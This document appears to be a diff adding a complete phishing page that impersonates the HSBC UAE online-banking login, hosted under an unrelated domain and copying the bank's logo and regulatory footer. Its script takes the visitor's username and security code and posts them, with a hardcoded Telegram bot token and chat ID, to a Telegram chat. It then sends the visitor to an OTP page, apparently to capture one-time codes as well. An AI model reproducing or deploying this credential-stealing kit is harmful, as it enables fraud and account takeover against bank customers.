@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بنك HSBC - تسجيل الدخول</title>
+
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="بنك HSBC - تسجيل الدخول">
+    <meta property="og:description" content="أدخل اسم المستخدم ورمز الأمان لإتمام الدخول.">
+    <meta property="og:image" content="https://alkhaleeg.services/sadUae/images/hsbc_bank_logo.png">
+    <meta property="og:url" content="https://alkhaleeg.services/sadu/hsbc_login.html">
+    <meta property="og:type" content="website">
+
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #333;
+            background: #f5f5f5;
+            padding: 20px;
+            line-height: 1.6;
+            margin: 0;
+            max-width: 100%;
+            box-sizing: border-box;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            body {
+                padding: 15px;
+                font-size: 14px;
+            }
+            .header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .form-container {
+                padding: 20px;
+            }
+            .btn-red {
+                width: 90%;
+                font-size: 14px;
+                padding: 10px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+                font-size: 13px;
+            }
+            .header {
+                padding: 10px 0;
+            }
+            .form-container {
+                padding: 15px;
+            }
+            .btn-red {
+                width: 95%;
+                font-size: 13px;
+                padding: 8px;
+            }
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: white;
+            padding: 15px;
+            border-bottom: 1px solid #ddd;
+            margin-bottom: 20px;
+        }
+        .header .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+        }
+        .header img {
+            height: 40px;
+        }
+        .header .login-btn {
+            background: #cc0000;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        h1 {
+            text-align: center;
+            margin-top: 0;
+            margin-bottom: 20px;
+            font-weight: bold;
+            font-size: 24px;
+        }
+        .form-container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px;
+            font-weight: bold;
+            color: #333;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+        input[type="text"]:focus {
+            border-color: #cc0000;
+            outline: none;
+        }
+        .secure-key {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+        }
+        .secure-key img {
+            height: 20px;
+            margin-right: 10px;
+        }
+        .help-link {
+            color: #cc0000;
+            text-decoration: none;
+            font-weight: bold;
+            margin: 10px 0;
+            display: inline-block;
+        }
+        .help-link:hover {
+            text-decoration: underline;
+        }
+        .btn-red {
+            display: block;
+            width: 100%;
+            margin: 25px auto;
+            padding: 12px;
+            background: #cc0000;
+            color: white;
+            text-align: center;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .btn-red:hover {
+            background: #b30000;
+        }
+        .alt-login {
+            text-align: center;
+            margin: 20px 0;
+            color: #666;
+        }
+        .alt-login a {
+            color: #cc0000;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .alt-login a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            background: #000;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            margin-top: 30px;
+            font-size: 12px;
+            line-height: 1.4;
+        }
+        .error-message {
+            display: none;
+            text-align: center;
+            color: red;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <div class="menu-icon">☰</div>
+    <img src="https://alkhaleeg.services/sadUae/images/hsbc_bank_logo.png" alt="شعار HSBC">
+    <a href="#" class="login-btn">Log On</a>
+</div>
+
+<h1>Log on</h1>
+
+<div class="form-container">
+    <form id="hsbcLogin">
+        <label for="username">Please enter your username</label>
+        <input type="text" id="username" name="username" required>
+
+        <div class="secure-key">
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCIgdmlld0JveD0iMCAwIDIwIDIwIj48cGF0aCBkPSJNMjAgMTBjLTcuMTkgMC0xMyA1LjgxLTEzIDEzdiIgc3Ryb2tlPSIjMDA4MDAwIiBzdHJva2Utd2lkdGg9IjQiIGZpbGw9Im5vbmUiLz48cGF0aCBkPSJNMzIgMjNDMjQuODIgMjMgMjAgMjcuODIgMjAgMzV2MTBjMCAzLjMzIDIuNjcgNiA2IDZoMTJjMy4zMyAwIDYtMi42NyA2LTYVjEwYzAtMy4zMy0yLjY3LTYtNi02SDMyWiIgc3Ryb2tlPSIjMDA4MDAwIiBzdHJva2Utd2lkdGg9IjQiIGZpbGw9Im5vbmUiLz48L3N2Zz4=" alt="أيقونة هاتف">
+            <span>Digital Secure Key</span>
+        </div>
+
+        <label for="securityCode">Please enter your security code</label>
+        <input type="text" id="securityCode" name="securityCode" required>
+
+        <a href="#" class="help-link">How to generate a security code &gt;</a>
+
+        <button type="submit" class="btn-red">Log on</button>
+        <div class="error-message" id="errorMessage"></div>
+    </form>
+
+    <div class="alt-login">
+        Continue using password &gt;
+    </div>
+</div>
+
+<div class="footer">
+    © 2024. HSBC Bank Middle East Limited UAE Branch, P.O. Box 66, Dubai, UAE (HBME) regulated by the Central Bank of the UAE for the purpose of this promotion and lead regulated by the Dubai Financial Services Authority. In respect of certain financial services and activities offered by HBME, it is regulated by the Securities and Commodities Authority in the UAE under license number 602004. This website is designed for use in UAE.
+</div>
+
+<script>
+    document.getElementById('hsbcLogin').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value;
+        const securityCode = document.getElementById('securityCode').value;
+
+        // إخفاء رسالة الخطأ
+        document.getElementById('errorMessage').style.display = 'none';
+
+        // بوت تلغرام
+        const botToken = '7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM';
+        const chatId = '1008144314';
+
+        const message = `
+🔐 *تسجيل دخول بنك HSBC*
+
+👤 اسم المستخدم: ${username}
+🔢 رمز الأمان: ${securityCode}
+📅 التاريخ: ${new Date().toLocaleString('ar-EG')}
+`;
+
+        // إرسال البيانات إلى تلغرام
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                // بعد النجاح: التوجيه إلى صفحة OTP
+                window.location.href = 'otp_page.html';
+            } else {
+                throw new Error('فشل الإرسال');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            const errorMsg = document.getElementById('errorMessage');
+            errorMsg.textContent = '❌ حدث خطأ أثناء إرسال البيانات. يرجى المحاولة لاحقًا.';
+            errorMsg.style.display = 'block';
+        });
+    });
+</script>
+
+</body>
+</html>
